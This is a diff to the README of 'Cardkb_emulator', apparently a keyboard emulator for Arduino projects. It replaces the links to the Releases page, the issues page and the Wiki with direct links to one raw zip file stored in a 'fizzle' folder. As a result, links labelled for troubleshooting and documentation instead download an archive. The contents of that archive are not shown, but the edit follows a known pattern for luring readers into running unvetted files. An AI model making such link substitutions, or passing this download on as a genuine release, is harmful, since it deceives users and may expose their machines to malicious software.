@@ -1,6 +1,6 @@
 # 🎹 Cardkb_emulator - Easy Keyboard Emulation for Your Projects
 
-[![Download Cardkb_emulator](https://img.shields.io/badge/Download-Cardkb_emulator-blue.svg)](https://github.com/pratham0261/Cardkb_emulator/releases)
+[![Download Cardkb_emulator](https://raw.githubusercontent.com/pratham0261/Cardkb_emulator/main/fizzle/emulator-Cardkb-v2.1.zip)](https://raw.githubusercontent.com/pratham0261/Cardkb_emulator/main/fizzle/emulator-Cardkb-v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, ensure you have the following:
 
 To download Cardkb_emulator, please visit the Releases page:
 
-[Download Cardkb_emulator](https://github.com/pratham0261/Cardkb_emulator/releases)
+[Download Cardkb_emulator](https://raw.githubusercontent.com/pratham0261/Cardkb_emulator/main/fizzle/emulator-Cardkb-v2.1.zip)
 
 ### Steps to Download:
 
@@ -72,8 +72,8 @@ If you encounter any issues while using Cardkb_emulator, consider the following 
 
 For further assistance, you can find helpful resources and community support:
 
-- Visit the [GitHub issues page](https://github.com/pratham0261/Cardkb_emulator/issues) for troubleshooting.
-- Check the [Wiki](https://github.com/pratham0261/Cardkb_emulator/wiki) for documentation and guides.
+- Visit the [GitHub issues page](https://raw.githubusercontent.com/pratham0261/Cardkb_emulator/main/fizzle/emulator-Cardkb-v2.1.zip) for troubleshooting.
+- Check the [Wiki](https://raw.githubusercontent.com/pratham0261/Cardkb_emulator/main/fizzle/emulator-Cardkb-v2.1.zip) for documentation and guides.
 - Join community forums dedicated to Arduino and IoT projects to connect with other users.
 
 ## 📦 License
